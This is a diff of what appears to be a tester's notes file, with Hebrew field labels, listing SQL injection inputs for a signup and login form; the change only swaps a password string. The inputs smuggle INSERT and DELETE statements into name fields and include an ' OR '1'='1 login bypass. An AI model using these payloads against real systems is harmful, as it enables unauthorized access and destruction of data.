@@ -42,11 +42,11 @@ John'); DELETE FROM customers WHERE id=2; --
 
 בSIGNUP: 
 בשם משפחה: (sqli)
-Doe', 'hacked2@example.com', 'Val765432!', 'salt'); INSERT INTO users (first_name, last_name, email, password) VALUES ('Hacker', 'Injected', 'hacked3@example.com', 'hacked_password'); --
+Doe', 'hacked2@example.com', 'Hac765432!', 'salt'); INSERT INTO users (first_name, last_name, email, password) VALUES ('Hacker', 'Injected', 'hacked3@example.com', 'hacked_password'); --
 
-Doe', 'hacked25@example.com', 'Val765432!', 'salt'); DELETE FROM users WHERE email='hacked2@example.com'; --
+Doe', 'hacked25@example.com', 'Hac765432!', 'salt'); DELETE FROM users WHERE email='hacked2@example.com'; --
 
 בLOGIN:
 באימייל:
 anything' OR '1'='1
-Val765432!!
+Hac765432!!
